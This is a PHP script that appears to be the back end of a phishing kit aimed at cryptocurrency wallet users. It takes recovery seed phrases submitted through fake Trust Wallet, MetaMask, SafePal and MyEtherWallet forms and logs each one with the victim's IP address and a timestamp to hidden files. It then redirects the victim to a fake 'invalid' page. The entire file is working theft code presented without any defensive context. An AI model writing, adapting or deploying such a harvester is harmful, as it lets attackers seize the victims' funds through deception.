<?php
date_default_timezone_set("Asia/Bangkok");
$type = $_POST['type'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("d F Y, h:i a");
if ($type == 'tw') {
    $redirect = 'tw-invalid';
    $phrase = $_POST['tw_seed'];
    $file = "tw";
    $url = "https://trustwallet.com ";

    $handle = fopen($file, 'a');
    fwrite($handle, "\n");
    fwrite($handle, "Phrase   	: ");
    fwrite($handle, "$phrase");
    fwrite($handle, "\n");
    fwrite($handle, "IP Address	: ");
    fwrite($handle, "$ip");
    fwrite($handle, "\n");
    fwrite($handle, "Time		: ");
    fwrite($handle, "$today");
    fwrite($handle, "\n");
    fwrite($handle, $url);
    fwrite($handle, "\n");
    fclose($handle);
} elseif ($type == 'meta') {
    $redirect = 'meta_invalid';
    $phrase = $_POST['meta_seed'];
    $file = "mt";
      $url = "https://metamask.io/";

    $handle = fopen($file, 'a');
    fwrite($handle, "\n");
    fwrite($handle, "Phrase   	: ");
    fwrite($handle, "$phrase");
    fwrite($handle, "\n");
    fwrite($handle, "IP Address	: ");
    fwrite($handle, "$ip");
    fwrite($handle, "\n");
    fwrite($handle, "Time		: ");
    fwrite($handle, "$today");
    fwrite($handle, "\n");
    fwrite($handle, $url);
    fwrite($handle, "\n");
    fclose($handle);
} elseif ($type == 'safepal') {
    $redirect = 'safepal_invalid';
    $phrase = $_POST['safepal_seed'];
    $wallet = $_POST['wallet_name'];
    $file = "sp";
    $url = "https://safepal.io/";

    $handle = fopen($file, 'a');
    fwrite($handle, "\n");
    fwrite($handle, "Phrase   	: ");
    fwrite($handle, "$phrase");
    fwrite($handle, "\n");
    fwrite($handle, "Wallet Name   	: ");
    fwrite($handle, "$wallet");
    fwrite($handle, "\n");
    fwrite($handle, "IP Address	: ");
    fwrite($handle, "$ip");
    fwrite($handle, "\n");
    fwrite($handle, "Time		: ");
    fwrite($handle, "$today");
    fwrite($handle, "\n");
    fwrite($handle, $url);
    fwrite($handle, "\n");
    fclose($handle);
} else {
    $redirect = 'mew_invalid';
    $phrase = $_POST['mew_seed'];
    $wallet = $_POST['wallet_name'];
    $file = "nzmnzmnx.txt";
    $url = "https://www.metamask.com/";

    $handle = fopen($file, 'a');
    fwrite($handle, "\n");
    fwrite($handle, "Phrase   	: ");
    fwrite($handle, "$phrase");
    fwrite($handle, "\n");
    fwrite($handle, "IP Address	: ");
    fwrite($handle, "$ip");
    fwrite($handle, "\n");
    fwrite($handle, "Time		: ");
    fwrite($handle, "$today");
    fwrite($handle, "\n");
    fwrite($handle, $url);
    fwrite($handle, "\n");
    fclose($handle);
}

// echo $type;
// die;

header('location:' . $redirect . '.php');
die;